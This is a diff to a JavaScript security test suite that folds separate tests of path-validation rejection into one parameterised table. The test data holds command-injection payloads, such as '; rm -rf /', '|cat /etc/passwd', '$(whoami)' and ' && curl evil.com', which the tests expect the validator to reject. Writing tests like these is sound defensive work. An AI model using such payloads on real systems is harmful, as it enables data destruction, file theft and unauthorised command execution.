@@ -17,43 +17,17 @@ describe('Path Validation Security', () => {
     });
 
     describe('Shell metacharacter rejection', () => {
-        test('should reject paths with backticks', async () => {
-            const maliciousPath = testRoot + '`whoami`';
-            await expect(validateRootDirectory(maliciousPath)).rejects.toThrow('Path contains unsafe characters');
-        });
-
-        test('should reject paths with dollar signs', async () => {
-            const maliciousPath = testRoot + '$(whoami)';
-            await expect(validateRootDirectory(maliciousPath)).rejects.toThrow('Path contains unsafe characters');
-        });
-
-        test('should reject paths with pipes', async () => {
-            const maliciousPath = testRoot + '|cat /etc/passwd';
-            await expect(validateRootDirectory(maliciousPath)).rejects.toThrow('Path contains unsafe characters');
-        });
-
-        test('should reject paths with semicolons', async () => {
-            const maliciousPath = testRoot + '; rm -rf /';
-            await expect(validateRootDirectory(maliciousPath)).rejects.toThrow('Path contains unsafe characters');
-        });
-
-        test('should reject paths with ampersands', async () => {
-            const maliciousPath = testRoot + ' && curl evil.com';
-            await expect(validateRootDirectory(maliciousPath)).rejects.toThrow('Path contains unsafe characters');
-        });
-
-        test('should reject paths with redirects', async () => {
-            const maliciousPath = testRoot + ' > /tmp/evil';
-            await expect(validateRootDirectory(maliciousPath)).rejects.toThrow('Path contains unsafe characters');
-        });
-
-        test('should reject paths with null bytes', async () => {
-            const maliciousPath = testRoot + '\0';
-            await expect(validateRootDirectory(maliciousPath)).rejects.toThrow('Path contains unsafe characters');
-        });
-
-        test('should reject paths with newlines', async () => {
-            const maliciousPath = testRoot + '\nrm -rf /';
+        test.each([
+            ['backticks', '`whoami`'],
+            ['dollar signs', '$(whoami)'],
+            ['pipes', '|cat /etc/passwd'],
+            ['semicolons', '; rm -rf /'],
+            ['ampersands', ' && curl evil.com'],
+            ['redirects', ' > /tmp/evil'],
+            ['null bytes', '\0'],
+            ['newlines', '\nrm -rf /']
+        ])('should reject paths with %s', async (_name, suffix) => {
+            const maliciousPath = testRoot + suffix;
             await expect(validateRootDirectory(maliciousPath)).rejects.toThrow('Path contains unsafe characters');
         });
 
